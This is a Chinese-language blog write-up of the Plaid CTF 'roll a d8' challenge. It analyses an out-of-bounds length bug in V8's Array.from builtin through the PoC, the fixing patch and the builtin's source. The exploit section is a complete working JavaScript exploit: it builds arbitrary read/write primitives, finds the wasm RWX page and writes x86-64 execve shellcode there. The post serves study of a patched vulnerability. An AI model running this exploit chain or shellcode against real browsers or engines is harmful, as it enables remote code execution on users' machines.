---

layout: post

title: 'Plaid CTFs roll a d8分析'

date: '2020-07-21'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

## 前言

### DSL语言

v8使用了CodeStubAssembler，一种可以用来生成汇编语言的”汇编器“，其使用的表示方式是一种DSL，通过编写DSL伪汇编代码，使得可以生成汇编代码，达到高效率以及跨平台的目的。

部分宏定义如下：

- TF_BUILTIN：创建一个函数
- Label：定义一个标签作为跳转的目标
- BIND：绑定标签作为跳转的目标
- Branch：条件跳转指令
- VARIABLE：定义变量
- Goto：跳转指令

链接: https://v8.dev/blog/csa

### Arrow Function(箭头函数)

如：

```
x => x * x
```

相当于：

```javascript
function (x) {
	return x * x;
}
```

相当于箭头函数左边为传入的参数，右边为函数返回值。

### Array.from 方法

Array.from 方法用于将类似数组的对象（array-like object）和可遍历（iterable）的对象转化成真正的数组，如下：

```c
let arrayLike = {
	'0': 'a',
	'1': 'b',
	'2': 'c',
	length: 3
};

let arr2 = Array.from(arrayLike); // ['a', 'b', 'c']
```

只要是部署了 Iterator 接口的数据结构，如字符串或Set， Array.from 都能将其转为数组：

```c
Array.from('hello')
// ['h', 'e', 'l', 'l', 'o']

let namesSet = new Set(['a', 'b'])
Array.from(namesSet) // ['a', 'b']
```

结合Array.from 方法和Arrow Function(箭头函数)，例子如下：

```javascript
console.log(Array.from('foo'));
// expected output: Array ["f", "o", "o"]

console.log(Array.from([1, 2, 3], x => x + x));
// expected output: Array [2, 4, 6]
```

### 环境搭建

```
git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
gclient sync
./tools/dev/gm.py x64.debug
```



## 题目分析

这是一个真实的漏洞，漏洞成因在于Array.from函数存在越界读写问题，PoC代码如下：

```javascript
// Copyright 2018 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
// Tests that creating an iterator that shrinks the array populated by
// Array.from does not lead to out of bounds writes.
let oobArray = [];
let maxSize = 1028 * 8;
%DebugPrint(oobArray.length);
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
//assertEquals(oobArray.length, maxSize);
// iterator reset the length to 0 just before returning done, so this will crash
// if the backing store was not resized correctly.
%DebugPrint(oobArray.length);
oobArray[oobArray.length - 1] = 0x41414141;
```
在编译成 x64.debug的d8运行结果如下：

![image-20200723171428842](..\image\2020-07-21-Plaid-CTF's-roll-a-d8分析\1.png)

经过Array.from函数处理后，oobArray.length从0变成了counter累加的结果：8224。之后对oobArray数组造成了越界访问。

修补漏洞的补丁如下：

```c
diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc
index dcf3be4..3a74342 100644
--- a/src/builtins/builtins-array-gen.cc
+++ b/src/builtins/builtins-array-gen.cc
@@ -1945,10 +1945,13 @@
   void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                          TNode<Number> length) {
     Label fast(this), runtime(this), done(this);
+    // TODO(delphick): We should be able to skip the fast set altogether, if the
+    // length already equals the expected length, which it always is now on the
+    // fast path.
     // Only set the length in this stub if
     // 1) the array has fast elements,
     // 2) the length is writable,
-    // 3) the new length is greater than or equal to the old length.
+    // 3) the new length is equal to the old length.
 
     // 1) Check that the array has fast elements.
     // TODO(delphick): Consider changing this since it does an an unnecessary
@@ -1970,10 +1973,10 @@
       // BranchIfFastJSArray above.
       EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);
 
-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);
 
       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                      length_smi);

```

补丁其实就是用`GotoIf(SmiNotEqual(length_smi, old_length), &runtime);`替换了`GotoIf(SmiLessThan(length_smi, old_length), &runtime);`，意思是当使用Array.from 生成的数组长度与原数组长度不同时，使用runtime 来设置相应的数组长度。

## 漏洞分析

对ArrayFrom函数的流程进行分析：

```c
ArrayFrom：
	->Branch(IsNullOrUndefined(iterator_method), &not_iterable, &iterable); //判断参数对象是否包含Symbol.iterator
	->Branch(IsNullOrUndefined(iterator_method), &not_iterable, &iterable);// 跳转到iterable进行处理
	->BIND(&iterable);
	->array = ConstructArrayLike(context, args.GetReceiver()); // 获得原数组
		->Branch(IsConstructor(CAST(receiver)), &is_constructor, &is_not_constructor);
		->BIND(&is_constructor);//当receiver满足IsConstructor时会直接调用Construct去调用它所对应的函数
		->array = Construct(context, CAST(receiver));//调用对应函数。即function() { return oobArray } ，直接返回oobArray，所以此时array和oobArray相同   <----------【1】
	->Goto(&loop); //跳转到循环处理部分
	->BIND(&loop); // 循环处理部分
		->value = CAST(v); //赋值给相应的array[index]
		->index = NumberInc(index.value()); // 每循环一次,index + 1
	->BIND(&loop_done);//循环结束
   		->length = index; //将index赋值给array的length  <-----------【2】
	->GenerateSetLength(context, array.value(), length.value());  //调用GenerateSetLength给array length赋值
        ->fast_array = CAST(array); // 数组指针
		->length_smi = CAST(length);// 迭代的次数
      	->old_length = LoadFastJSArrayLength(fast_array);//数组的原length <-------------【3】
		->GotoIf(SmiLessThan(length_smi, old_length), &runtime); //如果现在length小于数组的原length，则交给runtime处理，否则调用StoreObjectFieldNoWriteBarrier，将length_smi 赋值给fast_array 的length 字段。 <-----------【4】
		-> StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,length_smi);//将length_smi 赋值给fast_array 的length 字段。    <--------------【5】
```

漏洞成因：

【1】处receiver满足IsConstructor时，使用Construct 调用function() { return oobArray }，返回oobArray，所以array和oobArray相同，后续对array的操作，都是在原数组上操作。

【2】处进入循环处理后，将循环次数赋值给length

【3】此时，Poc在结束循环时将oobArray.length 赋值为0，导致old_length变成0

【4】处进行判断，此时length_smi为8224， old_length为0，直接调用StoreObjectFieldNoWriteBarrier

【5】将数组length赋值为循环次数。

最终导致length大于数组的原大小，造成可以越界读写。



漏洞函数ArrayFrom源码：

```c
// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
  TNode<Context> context = CAST(Parameter(BuiltinDescriptor::kContext));
  TNode<Int32T> argc =
      UncheckedCast<Int32T>(Parameter(BuiltinDescriptor::kArgumentsCount));

  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));

  TNode<Object> map_function = args.GetOptionalArgumentValue(1);

  // If map_function is not undefined, then ensure it's callable else throw.
  {
    Label no_error(this), error(this);
    GotoIf(IsUndefined(map_function), &no_error);
    GotoIf(TaggedIsSmi(map_function), &error);
    Branch(IsCallable(map_function), &no_error, &error);

    BIND(&error);
    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);

    BIND(&no_error);
  }

  Label iterable(this), not_iterable(this), finished(this), if_exception(this);

  TNode<Object> this_arg = args.GetOptionalArgumentValue(2);
  TNode<Object> items = args.GetOptionalArgumentValue(0);
  // The spec doesn't require ToObject to be called directly on the iterable
  // branch, but it's part of GetMethod that is in the spec.
  TNode<JSReceiver> array_like = ToObject(context, items);

  TVARIABLE(Object, array);
  TVARIABLE(Number, length);

  // Determine whether items[Symbol.iterator] is defined:
  IteratorBuiltinsAssembler iterator_assembler(state());
  Node* iterator_method =
      iterator_assembler.GetIteratorMethod(context, array_like);
  Branch(IsNullOrUndefined(iterator_method), &not_iterable, &iterable);

  BIND(&iterable);
  {
    TVARIABLE(Number, index, SmiConstant(0));
    TVARIABLE(Object, var_exception);
    Label loop(this, &index), loop_done(this),
        on_exception(this, Label::kDeferred),
        index_overflow(this, Label::kDeferred);

    // Check that the method is callable.
    {
      Label get_method_not_callable(this, Label::kDeferred), next(this);
      GotoIf(TaggedIsSmi(iterator_method), &get_method_not_callable);
      GotoIfNot(IsCallable(iterator_method), &get_method_not_callable);
      Goto(&next);

      BIND(&get_method_not_callable);
      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
                     iterator_method);

      BIND(&next);
    }

    // Construct the output array with empty length.
    array = ConstructArrayLike(context, args.GetReceiver());   <-------------------【1】

    // Actually get the iterator and throw if the iterator method does not yield
    // one.
    IteratorRecord iterator_record =
        iterator_assembler.GetIterator(context, items, iterator_method);

    TNode<Context> native_context = LoadNativeContext(context);
    TNode<Object> fast_iterator_result_map =
        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);

    Goto(&loop);

    BIND(&loop);
    {
      // Loop while iterator is not done.
      TNode<Object> next = CAST(iterator_assembler.IteratorStep(
          context, iterator_record, &loop_done, fast_iterator_result_map));
      TVARIABLE(Object, value,
                CAST(iterator_assembler.IteratorValue(
                    context, next, fast_iterator_result_map)));

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value returned from the iterator. Exceptions are
      // caught so the iterator can be closed.
      {
        Label next(this);
        GotoIf(IsUndefined(map_function), &next);

        CSA_ASSERT(this, IsCallable(map_function));
        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                         this_arg, value.value(), index.value());
        GotoIfException(v, &on_exception, &var_exception);
        value = CAST(v);
        Goto(&next);
        BIND(&next);
      }

      // Store the result in the output object (catching any exceptions so the
      // iterator can be closed).
      Node* define_status =
          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                      index.value(), value.value());
      GotoIfException(define_status, &on_exception, &var_exception);

      index = NumberInc(index.value());

      // The spec requires that we throw an exception if index reaches 2^53-1,
      // but an empty loop would take >100 days to do this many iterations. To
      // actually run for that long would require an iterator that never set
      // done to true and a target array which somehow never ran out of memory,
      // e.g. a proxy that discarded the values. Ignoring this case just means
      // we would repeatedly call CreateDataProperty with index = 2^53.
      CSA_ASSERT_BRANCH(this, [&](Label* ok, Label* not_ok) {
        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                           NumberConstant(kMaxSafeInteger), ok,
                                           not_ok);
      });
      Goto(&loop);
    }

    BIND(&loop_done);
    {
      length = index;  			 <--------------------------------【2】
      Goto(&finished);
    }

    BIND(&on_exception);
    {
      // Close the iterator, rethrowing either the passed exception or
      // exceptions thrown during the close.
      iterator_assembler.IteratorCloseOnException(context, iterator_record,
                                                  &var_exception);
    }
  }

  // Since there's no iterator, items cannot be a Fast JS Array.
  BIND(&not_iterable);
  {
    CSA_ASSERT(this, Word32BinaryNot(IsFastJSArray(array_like, context)));

    // Treat array_like as an array and try to get its length.
    length = ToLength_Inline(
        context, GetProperty(context, array_like, factory()->length_string()));

    // Construct an array using the receiver as constructor with the same length
    // as the input array.
    array = ConstructArrayLike(context, args.GetReceiver(), length.value());   

    TVARIABLE(Number, index, SmiConstant(0));

    GotoIf(SmiEqual(length.value(), SmiConstant(0)), &finished);

    // Loop from 0 to length-1.
    {
      Label loop(this, &index);
      Goto(&loop);
      BIND(&loop);
      TVARIABLE(Object, value);

      value = GetProperty(context, array_like, index.value());

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value retrieved from the array.
      {
        Label next(this);
        GotoIf(IsUndefined(map_function), &next);

        CSA_ASSERT(this, IsCallable(map_function));
        value = CAST(CallJS(CodeFactory::Call(isolate()), context, map_function,
                            this_arg, value.value(), index.value()));
        Goto(&next);
        BIND(&next);
      }

      // Store the result in the output object.
      CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                  index.value(), value.value());
      index = NumberInc(index.value());
      BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                         length.value(), &loop, &finished);
    }
  }

  BIND(&finished);

  // Finally set the length on the output and return it.
  GenerateSetLength(context, array.value(), length.value()); 
  args.PopAndReturn(array.value());
}
```



GenerateSetLength函数源码：

```c
 void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                         TNode<Number> length) {
    Label fast(this), runtime(this), done(this);
    // Only set the length in this stub if
    // 1) the array has fast elements,
    // 2) the length is writable,
    // 3) the new length is greater than or equal to the old length.

    // 1) Check that the array has fast elements.
    // TODO(delphick): Consider changing this since it does an an unnecessary
    // check for SMIs.
    // TODO(delphick): Also we could hoist this to after the array construction
    // and copy the args into array in the same way as the Array constructor.
    BranchIfFastJSArray(array, context, &fast, &runtime);

    BIND(&fast);
    {
      TNode<JSArray> fast_array = CAST(array);

      TNode<Smi> length_smi = CAST(length);
      TNode<Smi> old_length = LoadFastJSArrayLength(fast_array);<----------------------------【3】
      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));

      // 2) Ensure that the length is writable.
      // TODO(delphick): This check may be redundant due to the
      // BranchIfFastJSArray above.
      EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);

      // 3) If the created array already has a length greater than required,
      //    then use the runtime to set the property as that will insert holes
      //    into the excess elements and/or shrink the backing store.
      GotoIf(SmiLessThan(length_smi, old_length), &runtime);   <-----------------------------【4】

      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,  <------------------【5】
                                     length_smi);

      Goto(&done);
    }

    BIND(&runtime);
    {
      CallRuntime(Runtime::kSetProperty, context, static_cast<Node*>(array),
                  CodeStubAssembler::LengthStringConstant(), length,
                  SmiConstant(LanguageMode::kStrict));
      Goto(&done);
    }

    BIND(&done);
  }
};
```

ConstructArrayLike 源码：

```c
TNode<Object> ConstructArrayLike(TNode<Context> context,
                                   TNode<Object> receiver,
                                   TNode<Number> length) {
    TVARIABLE(Object, array);
    Label is_constructor(this), is_not_constructor(this), done(this);
    CSA_ASSERT(this, IsNumberNormalized(length));
    GotoIf(TaggedIsSmi(receiver), &is_not_constructor);
    Branch(IsConstructor(receiver), &is_constructor, &is_not_constructor);

    BIND(&is_constructor);
    {
      array = CAST(ConstructJS(CodeFactory::Construct(isolate()), context, <-------------------【1】
                               receiver, length)); 
      Goto(&done);
    }

    BIND(&is_not_constructor);
    {
      Label allocate_js_array(this);

      Label next(this), runtime(this, Label::kDeferred);
      TNode<Smi> limit = SmiConstant(JSArray::kInitialMaxFastElementArray);
      CSA_ASSERT_BRANCH(this, [=](Label* ok, Label* not_ok) {
        BranchIfNumberRelationalComparison(Operation::kGreaterThanOrEqual,
                                           length, SmiConstant(0), ok, not_ok);
      });
      // This check also transitively covers the case where length is too big
      // to be representable by a SMI and so is not usable with
      // AllocateJSArray.
      BranchIfNumberRelationalComparison(Operation::kGreaterThanOrEqual, length,
                                         limit, &runtime, &next);

      BIND(&runtime);
      {
        TNode<Context> native_context = LoadNativeContext(context);
        TNode<JSFunction> array_function = CAST(
            LoadContextElement(native_context, Context::ARRAY_FUNCTION_INDEX));
        array = CallRuntime(Runtime::kNewArray, context, array_function, length,
                            array_function, UndefinedConstant());
        Goto(&done);
      }

      BIND(&next);
      CSA_ASSERT(this, TaggedIsSmi(length));

      TNode<Map> array_map = CAST(LoadContextElement(
          context, Context::JS_ARRAY_PACKED_SMI_ELEMENTS_MAP_INDEX));

      // TODO(delphick): Consider using
      // AllocateUninitializedJSArrayWithElements to avoid initializing an
      // array and then writing over it.
      array = CAST(AllocateJSArray(PACKED_SMI_ELEMENTS, array_map, length,
                                   SmiConstant(0), nullptr,
                                   ParameterMode::SMI_PARAMETERS));
      Goto(&done);
    }

    BIND(&done);
    return array.value();
  }
```



## 漏洞利用

针对数组越界进行利用，首先是查找wasm code地址，但该题无法通过Function–>shared_info–>WasmExportedFunctionData–>instance来查找，改为通过Function–>shared_info->code->wasm function来进行查找。

之后是查找ArrayBuffer数组的backing_store，构造任意读和任意写，利用任意读泄露出wasm rwx的地址，最后利用任意写将shellcode写入wasm rwx地址。

exp代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);// 这里直接使用BigUint64Array显示undefined，只能转成32位，再拼接

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

//----- modify the length of float_array to oob 

var oobArray = [1.1, 2.2];
var obj = [];
var data_buf = [];
var maxSize = 1028 * 8;

Array.from.call(function(){return oobArray}, {[Symbol.iterator] : _ => (
    {
	counter : 0,
	next(){
		let result = this.counter++;
		if(this.counter > maxSize){
			oobArray.length = 1;
			oobArray[0] = 3.3;
			data_buf.push(new ArrayBuffer(0x233));
			let o = {mark: 1111222233334444, obj: wasm_function};
			obj.push(o);

			return {done: true};
		}else{
			return {value: result, done: false};
		}
	}
    }
)});


function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}

gc(); // 这里不太理解为啥触发垃圾回收机制就能将wasm function对象以及ArrayBuffer对象部署到oobArray element的后面？

//-----  find wasm_function_addr 

var float_obj_idx = 0;
for(let i=0; i < 0x100; i++)
{
	if(f2i(oobArray[i]) == 0x430f9534b3e01560){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(oobArray[float_obj_idx])));
		break;
	}
}
var wasm_function_addr = f2i(oobArray[float_obj_idx]) - 0x1;

//------ find backing_store

var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(oobArray[i]) == 0x0000023300000000){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(oobArray[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read

var data_view = new DataView(data_buf[0]);

function dataview_read64(addr)
{
	oobArray[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	oobArray[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

//-----  find wasm_code_rwx_addr 

var wasm_shared_info = dataview_read64(wasm_function_addr + 0x18);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_code = dataview_read64(wasm_shared_info - 0x1 + 0x8);
console.log("[+] find wasm_code : 0x" + hex(wasm_code));

var wasm_rwx_tmp = (dataview_read64(wasm_code - 0x1 + 0x70)); // 这里泄露出来的地址包含wasm rwx地址还多了两个字节，后续通过计算去除
console.log("[+] find wasm_rwx_tmp : 0x" + hex(wasm_rwx_tmp));

var wasm_rwx = ((wasm_rwx_tmp - (wasm_rwx_tmp % 0x10000))/ 0x10000); 
console.log("[+] find wasm_rwx_addr : 0x" + hex(wasm_rwx));


//write shellcode to wasm
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();
```



利用效果图：

![image-20200724121451080](..\image\2020-07-21-Plaid-CTF's-roll-a-d8分析\2.png)

## 参考链接

https://e3pem.github.io/2020/03/06/browser/pwnhub-d8/#more

https://xz.aliyun.com/t/5190